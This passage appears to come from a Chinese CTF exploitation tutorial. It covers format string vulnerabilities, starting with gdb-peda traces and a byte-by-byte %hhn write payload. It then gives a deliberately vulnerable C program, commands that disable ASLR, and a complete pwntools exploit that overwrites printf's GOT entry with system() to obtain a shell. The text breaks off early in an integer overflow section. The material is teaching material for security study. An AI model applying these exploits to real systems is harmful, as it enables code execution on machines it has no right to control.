0xffffd55c: 0x00004443 0x00000000 0x41414141 0x42424242 0xffffd56c: 0x43434343 0x44444444 0x00000000 0x000000c2 gdb-peda$ x/4wb 0xffffd538 0xffffd538: 0x88 0x88 0x88 0x88 \u7531\u4e8e\u6211\u4eec\u60f3\u8981\u9010\u5b57\u8282\u8986\u76d6\uff0c\u5c31\u9700\u8981 4 \u4e2a\u7528\u4e8e\u8df3\u8f6c\u7684\u5730\u5740\uff0c4 \u4e2a\u5199\u5165\u5730\u5740\u548c 4 \u4e2a\u503c\uff0c\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\uff08\u5c0f\u7aef\u5e8f\uff09\uff1a 0xffffd564 -> 0x41414141 (0xffffd538) -> \\x78 0xffffd568 -> 0x42424242 (0xffffd539) -> \\x56 0xffffd56c -> 0x43434343 (0xffffd53a) -> \\x34 0xffffd570 -> 0x44444444 (0xffffd53b) -> \\x12 \u628a AAAA \u3001 BBBB \u3001 CCCC \u3001 DDDD \u5360\u636e\u7684\u5730\u5740\u5206\u522b\u66ff\u6362\u6210\u62ec\u53f7\u4e2d\u7684\u503c\uff0c\u518d\u9002\u5f53\u4f7f\u7528\u586b\u5145\u5b57\u8282\u4f7f 8 \u5b57\u8282\u5bf9\u9f50\u5c31\u53ef\u4ee5\u4e86\u3002\u6784\u9020\u8f93\u5165\u5982\u4e0b\uff1a $ python2 -c 'print(\"\\x38\\xd5\\xff\\xff\"+\"\\x39\\xd5\\xff\\xff\"+\"\\x3a\\xd5\\xff\\xff\"+\"\\x3b\\xd5\\xff\\xff\"+\"%104c%13$hhn\"+\"%222c%14$hhn\"+\"%222c%15$hhn\"+\"%222c%16$hhn\")' > text \u5176\u4e2d\u524d\u56db\u4e2a\u90e8\u5206\u662f 4 \u4e2a\u5199\u5165\u5730\u5740\uff0c\u5360 4*4=16 \u5b57\u8282\uff0c\u540e\u9762\u56db\u4e2a\u90e8\u5206\u5206\u522b\u7528\u4e8e\u5199\u5165\u5341\u516d\u8fdb\u5236\u6570\uff0c\u7531\u4e8e\u4f7f\u7528\u4e86 hh \uff0c\u6240\u4ee5\u53ea\u4f1a\u4fdd\u7559\u4e00\u4e2a\u5b57\u8282 0x78 \uff0816+104=120 -> 0x78\uff09\u3001 0x56 \uff08120+222=342 -> 0x0156 -> 0x56\uff09\u3001 0x34 \uff08342+222=564 -> 0x0234 -> 0x34\uff09\u3001 0x12 \uff08564+222=786 -> 0x312 -> 0x12\uff09\u3002\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 gdb-peda$ r < text Starting program: /home/firmy/Desktop/RE4B/a.out < text [----------------------------------registers-----------------------------------] EAX: 0xffffd564 --> 0xffffd538 --> 0x88888888 EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x88888888 0008| 0xffffd534 --> 0x1 0012| 0xffffd538 --> 0x88888888 0016| 0xffffd53c --> 0xffffffff 0020| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0024| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x88888888 0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20x $esp 0xffffd52c: 0x08048520 0xffffd564 0x00000001 0x88888888 0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564 0x080481fc 0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd55c: 0x00004443 0x00000000 0xffffd538 0xffffd539 0xffffd56c: 0xffffd53a 0xffffd53b 0x34303125 0x33312563 gdb-peda$ finish Run till exit from #0 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 [----------------------------------registers-----------------------------------] EAX: 0x312 EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x0 EDX: 0xf7f98830 --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x12345678 EIP: 0x8048520 (<main+138>: add esp,0x20) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048514 <main+126>: lea eax,[ebp-0x94] 0x804851a <main+132>: push eax 0x804851b <main+133>: call 0x8048350 <printf@plt> => 0x8048520 <main+138>: add esp,0x20 0x8048523 <main+141>: sub esp,0xc 0x8048526 <main+144>: push 0xa 0x8048528 <main+146>: call 0x8048370 <putchar@plt> 0x804852d <main+151>: add esp,0x10 [------------------------------------stack-------------------------------------] 0000| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x12345678 0004| 0xffffd534 --> 0x1 0008| 0xffffd538 --> 0x12345678 0012| 0xffffd53c --> 0xffffffff 0016| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0020| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x12345678 0024| 0xffffd548 --> 0x80481fc --> 0x38 ('8') 0028| 0xffffd54c --> 0x80484b0 (<main+26>: add ebx,0x1b50) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x08048520 in main () gdb-peda$ x/20x $esp 0xffffd530: 0xffffd564 0x00000001 0x12345678 0xffffffff 0xffffd540: 0xffffd55a 0xffffd564 0x080481fc 0x080484b0 0xffffd550: 0xf7ffda54 0x00000001 0x424135d0 0x00004443 0xffffd560: 0x00000000 0xffffd538 0xffffd539 0xffffd53a 0xffffd570: 0xffffd53b 0x34303125 0x33312563 0x6e686824 \u6700\u540e\u8fd8\u5f97\u5f3a\u8c03\u4e24\u70b9\uff1a \u9996\u5148\u662f\u9700\u8981\u5173\u95ed\u6574\u4e2a\u7cfb\u7edf\u7684 ASLR \u4fdd\u62a4\uff0c\u8fd9\u53ef\u4ee5\u4fdd\u8bc1\u6808\u5728 gdb \u73af\u5883\u4e2d\u548c\u76f4\u63a5\u8fd0\u884c\u4e2d\u90fd\u4fdd\u6301\u4e0d\u53d8\uff0c\u4f46\u8fd9\u4e24\u4e2a\u6808\u5730\u5740\u4e0d\u4e00\u5b9a\u76f8\u540c \u5176\u6b21\u56e0\u4e3a\u5728 gdb \u8c03\u8bd5\u73af\u5883\u4e2d\u7684\u6808\u5730\u5740\u548c\u76f4\u63a5\u8fd0\u884c\u7a0b\u5e8f\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7ed3\u5408\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8bfb\u53d6\u5185\u5b58\uff0c\u5148\u6cc4\u9732\u4e00\u4e2a\u5730\u5740\u51fa\u6765\uff0c\u7136\u540e\u6839\u636e\u6cc4\u9732\u51fa\u6765\u7684\u5730\u5740\u8ba1\u7b97\u5b9e\u9645\u5730\u5740 x86-64 \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u5728 x64 \u4f53\u7cfb\u4e2d\uff0c\u591a\u6570\u8c03\u7528\u60ef\u4f8b\u90fd\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u53c2\u6570\u3002\u5728 Linux \u4e0a\uff0c\u524d\u516d\u4e2a\u53c2\u6570\u901a\u8fc7 RDI \u3001 RSI \u3001 RDX \u3001 RCX \u3001 R8 \u548c R9 \u4f20\u9012\uff1b\u800c\u5728 Windows \u4e2d\uff0c\u524d\u56db\u4e2a\u53c2\u6570\u901a\u8fc7 RCX \u3001 RDX \u3001 R8 \u548c R9 \u6765\u4f20\u9012\u3002 \u8fd8\u662f\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u6b21\u6211\u4eec\u628a\u5b83\u7f16\u8bd1\u6210 64 \u4f4d\uff1a $ gcc -fno-stack-protector -no-pie fmt.c \u4f7f\u7528 AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p. \u4f5c\u4e3a\u8f93\u5165\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0xffffffff RDX: 0x88888888 RSI: 0x1 RDI: 0x7fffffffe3d0 (\"AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\") RBP: 0x7fffffffe460 --> 0x400660 (<__libc_csu_init>: push r15) RSP: 0x7fffffffe3c0 --> 0x4241000000000000 ('') RIP: 0x400648 (<main+113>: call 0x4004e0 <printf@plt>) R8 : 0x7fffffffe3c6 --> 0x44434241 ('ABCD') R9 : 0xa ('\\n') R10: 0x7ffff7dd4380 --> 0x7ffff7dd0640 --> 0x7ffff7b9ed3a --> 0x636d656d5f5f0043 ('C') R11: 0x246 R12: 0x400500 (<_start>: xor ebp,ebp) R13: 0x7fffffffe540 --> 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x40063d <main+102>: mov r8,rdi 0x400640 <main+105>: mov rdi,rax 0x400643 <main+108>: mov eax,0x0 => 0x400648 <main+113>: call 0x4004e0 <printf@plt> 0x40064d <main+118>: mov edi,0xa 0x400652 <main+123>: call 0x4004d0 <putchar@plt> 0x400657 <main+128>: nop 0x400658 <main+129>: leave Guessed arguments: arg[0]: 0x7fffffffe3d0 (\"AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0x7fffffffe3c6 --> 0x44434241 ('ABCD') [------------------------------------stack-------------------------------------] 0000| 0x7fffffffe3c0 --> 0x4241000000000000 ('') 0008| 0x7fffffffe3c8 --> 0x4443 ('CD') 0016| 0x7fffffffe3d0 (\"AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\") 0024| 0x7fffffffe3d8 (\"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\") 0032| 0x7fffffffe3e0 (\".%p.%p.%p.%p.%p.%p.%p.\") 0040| 0x7fffffffe3e8 (\"p.%p.%p.%p.%p.\") 0048| 0x7fffffffe3f0 --> 0x2e70252e7025 ('%p.%p.') 0056| 0x7fffffffe3f8 --> 0x1 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x0000000000400648 in main () gdb-peda$ x/10g $rsp 0x7fffffffe3c0: 0x4241000000000000 0x0000000000004443 0x7fffffffe3d0: 0x4141414141414141 0x70252e70252e7025 0x7fffffffe3e0: 0x252e70252e70252e 0x2e70252e70252e70 0x7fffffffe3f0: 0x00002e70252e7025 0x0000000000000001 0x7fffffffe400: 0x0000000000f0b5ff 0x00000000000000c2 gdb-peda$ c Continuing. AAAAAAAA0x1.0x88888888.0xffffffff.0x7fffffffe3c6.0xa.0x4241000000000000.0x4443.0x4141414141414141.0x70252e70252e7025.0x252e70252e70252e. \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6700\u540e\u7684\u8f93\u51fa\u4e2d\uff0c\u524d\u4e94\u4e2a\u6570\u5b57\u5206\u522b\u6765\u81ea\u5bc4\u5b58\u5668 RSI \u3001 RDX \u3001 RCX \u3001 R8 \u548c R9 \uff0c\u540e\u9762\u7684\u6570\u5b57\u624d\u53d6\u81ea\u6808\uff0c 0x4141414141414141 \u5728 %8$p \u7684\u4f4d\u7f6e\u3002\u8fd9\u91cc\u8fd8\u6709\u4e2a\u5730\u65b9\u8981\u6ce8\u610f\uff0c\u6211\u4eec\u524d\u9762\u8bf4\u7684 Linux \u6709 6 \u4e2a\u5bc4\u5b58\u5668\u7528\u4e8e\u4f20\u9012\u53c2\u6570\uff0c\u53ef\u662f\u8fd9\u91cc\u53ea\u8f93\u51fa\u4e86 5 \u4e2a\uff0c\u539f\u56e0\u662f\u6709\u4e00\u4e2a\u5bc4\u5b58\u5668 RDI \u88ab\u7528\u4e8e\u4f20\u9012\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u4ece gdb \u4e2d\u770b\u5230\uff0c arg[0] \u5c31\u662f\u7531 RDI \u4f20\u9012\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002\uff08\u73b0\u5728\u4f60\u53ef\u4ee5\u518d\u56de\u5230 x86 \u7684\u76f8\u5173\u5185\u5bb9\uff0c\u53ef\u4ee5\u770b\u5230\u5728 x86 \u4e2d\u683c\u5f0f\u5b57\u7b26\u4e32\u901a\u8fc7\u6808\u4f20\u9012\u7684\uff0c\u4f46\u662f\u540c\u6837\u7684\u4e5f\u4e0d\u4f1a\u88ab\u6253\u5370\u51fa\u6765\uff09\u5176\u4ed6\u7684\u64cd\u4f5c\u548c x86 \u6ca1\u6709\u4ec0\u4e48\u5927\u7684\u533a\u522b\uff0c\u53ea\u662f\u8fd9\u65f6\u6211\u4eec\u5c31\u4e0d\u80fd\u4fee\u6539 arg2 \u7684\u503c\u4e86\uff0c\u56e0\u4e3a\u5b83\u88ab\u5b58\u5165\u4e86\u5bc4\u5b58\u5668\u4e2d\u3002 CTF \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e pwntools pwnlib.fmtstr \u6a21\u5757 \u6587\u6863\u5730\u5740\uff1ahttp://pwntools.readthedocs.io/en/stable/fmtstr.html \u8be5\u6a21\u5757\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u5de5\u5177\u3002\u8be5\u6a21\u5757\u4e2d\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7c7b FmtStr \u548c\u4e00\u4e2a\u51fd\u6570 fmtstr_payload \u3002 FmtStr \u63d0\u4f9b\u4e86\u81ea\u52a8\u5316\u7684\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\uff1a class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0) execute_fmt (function)\uff1a\u4e0e\u6f0f\u6d1e\u8fdb\u7a0b\u8fdb\u884c\u4ea4\u4e92\u7684\u51fd\u6570 offset (int)\uff1a\u4f60\u63a7\u5236\u7684\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u7a0b\u5e8f\u7684\u504f\u79fb\u91cf padlen (int)\uff1a\u5728 paylod \u4e4b\u524d\u6dfb\u52a0\u7684 pad \u7684\u5927\u5c0f numbwritten (int)\uff1a\u5df2\u7ecf\u5199\u5165\u7684\u5b57\u8282\u6570 fmtstr_payload \u7528\u4e8e\u81ea\u52a8\u751f\u6210\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 paylod\uff1a pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') offset (int)\uff1a\u4f60\u63a7\u5236\u7684\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u7a0b\u5e8f\u7684\u504f\u79fb\u91cf writes (dict)\uff1a\u683c\u5f0f\u4e3a {addr: value, addr2: value2}\uff0c\u7528\u4e8e\u5f80 addr \u91cc\u5199\u5165 value \u7684\u503c\uff08\u5e38\u7528\uff1a{printf_got}\uff09 numbwritten (int)\uff1a\u5df2\u7ecf\u7531 printf \u51fd\u6570\u5199\u5165\u7684\u5b57\u8282\u6570 write_size (str)\uff1a\u5fc5\u987b\u662f byte\uff0cshort \u6216 int\u3002\u544a\u8bc9\u4f60\u662f\u8981\u9010 byte \u5199\uff0c\u9010 short \u5199\u8fd8\u662f\u9010 int \u5199\uff08hhn\uff0chn\u6216n\uff09 \u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u6765\u719f\u6089\u4e0b\u8be5\u6a21\u5757\u7684\u4f7f\u7528\uff08\u4efb\u610f\u5730\u5740\u5185\u5b58\u8bfb\u5199\uff09\uff1a fmt.c fmt #include<stdio.h> void main() { char str[1024]; while(1) { memset(str, '\\0', 1024); read(0, str, 1024); printf(str); fflush(stdout); } } \u4e3a\u4e86\u7b80\u5355\u4e00\u70b9\uff0c\u6211\u4eec\u5173\u95ed ASLR\uff0c\u5e76\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7f16\u8bd1\uff0c\u5173\u95ed PIE\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u7684 .text .bss \u7b49\u6bb5\u7684\u5185\u5b58\u5730\u5740\u56fa\u5b9a\uff1a # echo 0 > /proc/sys/kernel/randomize_va_space $ gcc -m32 -fno-stack-protector -no-pie fmt.c \u5f88\u660e\u663e\uff0c\u7a0b\u5e8f\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u7684\u601d\u8def\u662f\u5c06 printf() \u51fd\u6570\u7684\u5730\u5740\u6539\u6210 system() \u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u6837\u5f53\u6211\u4eec\u518d\u6b21\u8f93\u5165 /bin/sh \u65f6\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97 shell \u4e86\u3002 \u7b2c\u4e00\u6b65\u5148\u8ba1\u7b97\u504f\u79fb\uff0c\u867d\u7136 pwntools \u4e2d\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u6784\u9020\u51fa exp\uff0c\u4f46\u8fd9\u91cc\uff0c\u6211\u4eec\u8fd8\u662f\u5148\u6f14\u793a\u624b\u5de5\u65b9\u6cd5\u600e\u4e48\u505a\uff0c\u6700\u540e\u518d\u7528 pwntools \u7684\u65b9\u6cd5\u3002\u5728 gdb \u4e2d\uff0c\u5148\u5728 main \u5904\u4e0b\u65ad\u70b9\uff0c\u8fd0\u884c\u7a0b\u5e8f\uff0c\u8fd9\u65f6 libc \u5df2\u7ecf\u88ab\u52a0\u8f7d\u8fdb\u6765\u4e86\u3002\u6211\u4eec\u8f93\u5165 \"AAAA\" \u8bd5\u4e00\u4e0b\uff1a gdb-peda$ b main ... gdb-peda$ r ... gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd1f0 (\"AAAA\\n\") EBX: 0x804a000 --> 0x8049f10 --> 0x1 ECX: 0xffffd1f0 (\"AAAA\\n\") EDX: 0x400 ESI: 0xf7f97000 --> 0x1bbd90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd1e0 --> 0xffffd1f0 (\"AAAA\\n\") EIP: 0x8048512 (<main+92>: call 0x8048370 <printf@plt>) EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048508 <main+82>: sub esp,0xc 0x804850b <main+85>: lea eax,[ebp-0x408] 0x8048511 <main+91>: push eax => 0x8048512 <main+92>: call 0x8048370 <printf@plt> 0x8048517 <main+97>: add esp,0x10 0x804851a <main+100>: mov eax,DWORD PTR [ebx-0x4] 0x8048520 <main+106>: mov eax,DWORD PTR [eax] 0x8048522 <main+108>: sub esp,0xc Guessed arguments: arg[0]: 0xffffd1f0 (\"AAAA\\n\") [------------------------------------stack-------------------------------------] 0000| 0xffffd1e0 --> 0xffffd1f0 (\"AAAA\\n\") 0004| 0xffffd1e4 --> 0xffffd1f0 (\"AAAA\\n\") 0008| 0xffffd1e8 --> 0x400 0012| 0xffffd1ec --> 0x80484d0 (<main+26>: add ebx,0x1b30) 0016| 0xffffd1f0 (\"AAAA\\n\") 0020| 0xffffd1f4 --> 0xa ('\\n') 0024| 0xffffd1f8 --> 0x0 0028| 0xffffd1fc --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x08048512 in main () \u6211\u4eec\u770b\u5230\u8f93\u5165 printf() \u7684\u53d8\u91cf arg[0]: 0xffffd1f0 (\"AAAA\\n\") \u5728\u6808\u7684\u7b2c 5 \u884c\uff0c\u9664\u53bb\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5373\u504f\u79fb\u91cf\u4e3a 4\u3002 \u8bfb\u53d6\u91cd\u5b9a\u4f4d\u8868\u83b7\u5f97 printf() \u7684 GOT \u5730\u5740\uff08\u7b2c\u4e00\u5217 Offset\uff09\uff1a $ readelf -r a.out Relocation section '.rel.dyn' at offset 0x2f4 contains 2 entries: Offset Info Type Sym.Value Sym. Name 08049ff8 00000406 R_386_GLOB_DAT 00000000 __gmon_start__ 08049ffc 00000706 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 Relocation section '.rel.plt' at offset 0x304 contains 5 entries: Offset Info Type Sym.Value Sym. Name 0804a00c 00000107 R_386_JUMP_SLOT 00000000 read@GLIBC_2.0 0804a010 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.0 0804a014 00000307 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 0804a018 00000507 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a01c 00000607 R_386_JUMP_SLOT 00000000 memset@GLIBC_2.0 \u5728 gdb \u4e2d\u83b7\u5f97 printf() \u7684\u865a\u62df\u5730\u5740\uff1a gdb-peda$ p printf $1 = {<text variable, no debug info>} 0xf7e26bf0 <printf> \u83b7\u5f97 system() \u7684\u865a\u62df\u5730\u5740\uff1a gdb-peda$ p system $1 = {<text variable, no debug info>} 0xf7e17060 <system> \u597d\u4e86\uff0c\u6f14\u793a\u5b8c\u600e\u6837\u7528\u624b\u5de5\u7684\u65b9\u5f0f\u5f97\u5230\u6784\u9020 exp \u9700\u8981\u7684\u4fe1\u606f\uff0c\u4e0b\u9762\u6211\u4eec\u7ed9\u51fa\u4f7f\u7528 pwntools \u6784\u9020\u7684\u5b8c\u6574\u6f0f\u6d1e\u5229\u7528\u4ee3\u7801\uff1a # -*- coding: utf-8 -*- from pwn import * elf = ELF('./a.out') r = process('./a.out') libc = ELF('/usr/lib32/libc.so.6') # \u8ba1\u7b97\u504f\u79fb\u91cf def exec_fmt(payload): r.sendline(payload) info = r.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset # \u83b7\u5f97 printf \u7684 GOT \u5730\u5740 printf_got = elf.got['printf'] log.success(\"printf_got => {}\".format(hex(printf_got))) # \u83b7\u5f97 printf \u7684\u865a\u62df\u5730\u5740 payload = p32(printf_got) + '%{}$s'.format(offset) r.send(payload) printf_addr = u32(r.recv()[4:8]) log.success(\"printf_addr => {}\".format(hex(printf_addr))) # \u83b7\u5f97 system \u7684\u865a\u62df\u5730\u5740 system_addr = printf_addr - (libc.symbols['printf'] - libc.symbols['system']) log.success(\"system_addr => {}\".format(hex(system_addr))) payload = fmtstr_payload(offset, {printf_got : system_addr}) r.send(payload) r.send('/bin/sh') r.recv() r.interactive() $ python2 exp.py [*] '/home/firmy/Desktop/RE4B/a.out' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './a.out': pid 17375 [*] '/usr/lib32/libc.so.6' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] Found format string offset: 4 [+] printf_got => 0x804a010 [+] printf_addr => 0xf7e26bf0 [+] system_addr => 0xf7e17060 [*] Switching to interactive mode $ echo \"hacked!\" hacked! \u8fd9\u6837\u6211\u4eec\u5c31\u83b7\u5f97\u4e86 shell\uff0c\u53ef\u4ee5\u770b\u5230\u8f93\u51fa\u7684\u4fe1\u606f\u548c\u6211\u4eec\u624b\u5de5\u5f97\u5230\u7684\u4fe1\u606f\u5b8c\u5168\u76f8\u540c\u3002 3.1.2 \u6574\u6570\u6ea2\u51fa \u4ec0\u4e48\u662f\u6574\u6570\u6ea2\u51fa \u6574\u6570\u6ea2\u51fa \u6574\u6570\u6ea2\u51fa\u793a\u4f8b CTF \u4e2d\u7684\u6574\u6570\u6ea2\u51fa \u4ec0\u4e48\u662f\u6574\u6570\u6ea2\u51fa \u7b80\u4ecb \u5728 C \u8bed\u8a00\u57fa\u7840\u7684\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86 C \u8bed\u8a00\u6574\u6570\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u4e0b\u9762\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u6574\u6570\u7684\u5b89\u5168\u95ee\u9898\u3002 \u7531\u4e8e\u6574\u6570\u5728\u5185\u5b58\u91cc\u9762\u4fdd\u5b58\u5728\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u7a7a\u95f4\u5185\uff0c\u5b83\u80fd\u5b58\u50a8\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u662f\u56fa\u5b9a\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u53bb\u5b58\u50a8\u4e00\u4e2a\u6570\uff0c\u800c\u8fd9\u4e2a\u6570\u53c8\u5927\u4e8e\u8fd9\u4e2a\u56fa\u5b9a\u7684\u6700\u5927\u503c\u65f6\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6574\u6570\u6ea2\u51fa\u3002\uff08x86-32 \u7684\u6570\u636e\u6a21\u578b\u662f ILP32\uff0c\u5373\u6574\u6570\uff08Int\uff09\u3001\u957f\u6574\u6570\uff08Long\uff09\u548c\u6307\u9488\uff08Pointer\uff09\u90fd\u662f 32 \u4f4d\u3002\uff09 \u6574\u6570\u6ea2\u51fa\u7684\u5371\u5bb3 \u5982\u679c\u4e00\u4e2a\u6574\u6570\u7528\u6765\u8ba1\u7b97\u4e00\u4e9b\u654f\u611f\u6570\u503c\uff0c\u5982\u7f13\u51b2\u533a\u5927\u5c0f\u6216\u6570\u503c\u7d22\u5f15\uff0c\u5c31\u4f1a\u4ea7\u751f\u6f5c\u5728\u7684\u5371\u9669\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6574\u6570\u6ea2\u51fa\u5e76\u6ca1\u6709\u6539\u5199\u989d\u5916\u7684\u5185\u5b58\uff0c\u4e0d\u4f1a\u76f4\u63a5\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\uff0c\u4f46\u662f\u5b83\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa\u548c\u5806\u6ea2\u51fa\uff0c\u800c\u540e\u4e24\u8005\u90fd\u4f1a\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\u7531\u4e8e\u6574\u6570\u6ea2\u51fa\u51fa\u73b0\u4e4b\u540e\uff0c\u5f88\u96be\u88ab\u7acb\u5373\u5bdf\u89c9\uff0c\u6bd4\u8f83\u96be\u7528\u4e00\u4e2a\u6709\u6548\u7684\u65b9\u6cd5\u53bb\u5224\u65ad\u662f\u5426\u51fa\u73b0\u6216\u8005\u53ef\u80fd\u51fa\u73b0\u6574\u6570\u6ea2\u51fa\u3002 \u6574\u6570\u6ea2\u51fa \u5173\u4e8e\u6574\u6570\u7684\u5f02\u5e38\u60c5\u51b5\u4e3b\u8981\u6709\u4e09\u79cd\uff1a \u6ea2\u51fa \u53ea\u6709\u6709\u7b26\u53f7\u6570\u624d\u4f1a\u53d1\u751f\u6ea2\u51fa\u3002\u6709\u7b26\u53f7\u6570\u6700\u9ad8\u4f4d\u8868\u793a\u7b26\u53f7\uff0c\u5728\u4e24\u6b63\u6216\u4e24\u8d1f\u76f8\u52a0\u65f6\uff0c\u6709\u53ef\u80fd\u6539\u53d8\u7b26\u53f7\u4f4d\u7684\u503c\uff0c\u4ea7\u751f\u6ea2\u51fa \u6ea2\u51fa\u6807\u5fd7 OF \u53ef\u68c0\u6d4b\u6709\u7b26\u53f7\u6570\u7684\u6ea2\u51fa \u56de\u7ed5 \u65e0\u7b26\u53f7\u6570 0-1 \u65f6\u4f1a\u53d8\u6210\u6700\u5927\u7684\u6570\uff0c\u5982 1 \u5b57\u8282\u7684\u65e0\u7b26\u53f7\u6570\u4f1a\u53d8\u4e3a 255 \uff0c\u800c 255+1 \u4f1a\u53d8\u6210\u6700\u5c0f\u6570 0 \u3002 \u8fdb\u4f4d\u6807\u5fd7 CF \u53ef\u68c0\u6d4b\u65e0\u7b26\u53f7\u6570\u7684\u56de\u7ed5 \u622a\u65ad \u5c06\u4e00\u4e2a\u8f83\u5927\u5bbd\u5ea6\u7684\u6570\u5b58\u5165\u4e00\u4e2a\u5bbd\u5ea6\u5c0f\u7684\u64cd\u4f5c\u6570\u4e2d\uff0c\u9ad8\u4f4d\u53d1\u751f\u622a\u65ad \u6709\u7b26\u53f7\u6574\u6570\u6ea2\u51fa \u4e0a\u6ea2\u51fa int i; i = INT_MAX; // 2 147 483 647 i++; printf(\"i = %d\\n\", i); // i 